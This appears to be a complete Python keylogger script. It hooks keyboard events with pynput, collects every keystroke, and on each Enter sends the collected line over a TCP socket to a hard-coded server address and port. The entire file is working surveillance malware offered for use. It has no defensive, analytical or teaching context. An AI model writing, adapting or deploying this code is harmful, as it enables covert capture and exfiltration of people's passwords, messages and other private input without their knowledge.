import socket
import sys
from pynput import keyboard


# initializing the socket
soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

IP = "192.168.1.54"  # the ip of the server.
PORT = 5050  # the port of the server.

soc.connect((IP, PORT))  # connecting to the server.

msg = '\n'
def on_press(key):  
    global msg
    print("Key pressed:", key)
    if key != keyboard.Key.enter:
        msg += str(key)
    else:
        soc.sendall(msg.encode('utf-8'))
        msg = '\n'

# Collect events until released
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
